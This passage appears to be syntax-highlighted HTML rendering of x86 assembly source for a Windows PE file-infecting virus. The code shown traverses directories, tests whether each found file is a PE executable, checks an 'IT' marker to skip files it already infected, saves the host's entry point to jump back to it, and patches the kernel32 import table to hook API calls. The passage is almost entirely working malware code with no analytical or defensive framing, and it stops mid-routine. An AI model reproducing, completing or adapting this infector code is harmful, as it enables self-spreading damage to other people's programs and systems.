        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_FindNextFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Find</span><span class="sc0">
     
 </span><span class="sc5">Updir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_FindClose</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">Updir0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Depth</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DotDot</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindN</span><span class="sc0">         
        
 </span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;jmp to host code</span><span class="sc0">

</span><span class="sc1">;[Restore saved directory]:</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DirExe</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_Thread</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">pushad</span><span class="sc0">

 </span><span class="sc5">TestFile</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">VirLength</span><span class="sc0">
   
</span><span class="sc1">;***** Test if the file is a true PE-executable file</span><span class="sc0">
       
       </span><span class="sc5">OpenFileStuff</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitInfectError</span><span class="sc0">                   

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;save mapping address </span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">            </span><span class="sc1">;Avoid Page Fault</span><span class="sc0">
       </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">                     

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;edx points to PE-header</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">                 </span><span class="sc1">;true PE exe there?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">                  

</span><span class="sc1">;***** End of EXE-PE test</span><span class="sc0">

</span><span class="sc1">;***** Already infected? </span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc3">"IT"</span><span class="sc0">             </span><span class="sc1">;infected?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitInfectError</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                               

</span><span class="sc1">;**** End of infection test</span><span class="sc0">
           
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                            
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                             </span><span class="sc1">;edi=beginning of optional header</span><span class="sc0">

</span><span class="sc1">;[Compute the return address to target code]:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;ebx=Entry Point RVA</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;save it</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RVA_EP</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;ebx=ImageBase Address in</span><span class="sc0">
                                               </span><span class="sc1">;memory </span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldEip</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">;save it </span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PushPatch</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">       

       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;cx=size of optionnal header</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;edi points to 1st section header</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;cx= number of sections</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SectN</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;ebx points on 1st section header</span><span class="sc0">

</span><span class="sc1">;compute last section header address</span><span class="sc0">

       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;set eax=0</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;ecx=number of sections -1 </span><span class="sc0">
       
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;esi=first section header</span><span class="sc0">
                                               </span><span class="sc1">;address</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                              </span><span class="sc1">;al=size of a section header</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                                  </span><span class="sc1">;eax=28h*(number of section-1)</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;esi=pointer to last section</span><span class="sc0">
                                               </span><span class="sc1">;header  </span><span class="sc0">
</span><span class="sc1">;ebx,edi=beginning of 1st section header</span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;put Entry Point RVA in eax</span><span class="sc0">

</span><span class="sc1">;***** Search code section:</span><span class="sc0">
</span><span class="sc1">;      In : edi holds file pointer to first section header</span><span class="sc0">
</span><span class="sc1">;         : eax holds Entry Point RVA</span><span class="sc0">
</span><span class="sc1">;***** Out: edi holds File ptr to the "code section"</span><span class="sc0">
 
        </span><span class="sc5">NotEnough</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          
        </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">FoundCode</span><span class="sc0">  
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">NotEnough</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">  

        </span><span class="sc5">FoundCode</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">

</span><span class="sc1">;***** Search code section end</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;don't want to infect files</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">              </span><span class="sc1">;with rawdata size=0 ...</span><span class="sc0">
                                         </span><span class="sc1">;no real section on disk here</span><span class="sc0">
                                         </span><span class="sc1">;if we try ...file is overwritten!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;don't want to infect files</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">80000000h</span><span class="sc0">                </span><span class="sc1">;with a last section writable</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">             </span><span class="sc1">;surely an exe archive or packed file</span><span class="sc0">
          
</span><span class="sc1">;ebx= begin of section headers</span><span class="sc0">
</span><span class="sc1">;edi= begin of code section</span><span class="sc0">

</span><span class="sc1">;eax = "code section" offset in mapping area </span><span class="sc0">

          </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;restore and save Entry Point</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;RVA</span><span class="sc0">
  
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;compute file pointer of</span><span class="sc0">
                                 
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RVA_EP</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Entry Point on disk</span><span class="sc0">

          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
          
</span><span class="sc1">;[Import table patching routine]:</span><span class="sc0">

       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;save on stack ImageBase</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;eax= address of the </span><span class="sc0">
                                               </span><span class="sc1">;"import table"</span><span class="sc0">

</span><span class="sc1">;eax=RVA "Imports table"</span><span class="sc0">
</span><span class="sc1">;ebx=RVA  "Sections table"</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">                                </span><span class="sc1">;eax=file pointer to Import table</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                                   </span><span class="sc1">;edi= "     "      "   "     "</span><span class="sc0">

</span><span class="sc5">SearchDll</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_NotFound</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"NREK"</span><span class="sc0">                   </span><span class="sc1">;are there imports</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DllFound</span><span class="sc0">                                  </span><span class="sc1">;from kernel32.dll?</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"nrek"</span><span class="sc0">                   </span><span class="sc1">;  "      "</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DllFound</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchDll</span><span class="sc0">

</span><span class="sc5">_NotFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0"> 

</span><span class="sc5">DllFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NotNewStyleBound</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                           </span><span class="sc1">;esi points to the start of the </span><span class="sc0">
                                      </span><span class="sc1">;bound directory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                           

</span><span class="sc5">ExploreBoundDir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                              </span><span class="sc1">;"pointer" to the name of a dll</span><span class="sc0">
                                       </span><span class="sc1">;exporting functions </span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"NREK"</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FoundBoundDll</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"nrek"</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExploreBoundDir</span><span class="sc0">

</span><span class="sc5">FoundBoundDll</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NotNewStyleBound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;TimeDate stamp set to 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;eax=RVA of OriginalFirstThunk </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;edx=RVA of FirstThunk</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">No_OFT</span><span class="sc0">                              

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">                        </span><span class="sc1">;compute OFT file pointer </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;save OFT file pointer</span><span class="sc0">

</span><span class="sc1">;[Compute the number of imported APIs from KERNEL32.DLL]:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                               
                                        
</span><span class="sc5">ApiScan</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ApiScan</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc1">;******************************************************************</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;restore OFT file pointer</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OFT_Found</span><span class="sc0">

</span><span class="sc5">No_OFT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                            

</span><span class="sc5">OFT_Found</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">                        </span><span class="sc1">;eax contains the RVA of an array of</span><span class="sc0">
                                       </span><span class="sc1">;RVAs.</span><span class="sc0">
                                       </span><span class="sc1">;Each of these RVAs points to a structure</span><span class="sc0">
                                       </span><span class="sc1">;The number of structures equal the</span><span class="sc0">
                                       </span><span class="sc1">;number of imported functions from</span><span class="sc0">
                                       </span><span class="sc1">;kernel32.dll</span><span class="sc0">
                                       </span><span class="sc1">;We need to convert eax into a file</span><span class="sc0">
                                       </span><span class="sc1">;pointer.</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ApiHack</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">Loop2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;read an RVA of array</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_NotFound</span><span class="sc0">

</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">80000000h</span><span class="sc0">                     </span><span class="sc1">;ordinal?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Loop2</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;convert RVA to file offset</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;esi points to api name</span><span class="sc0">
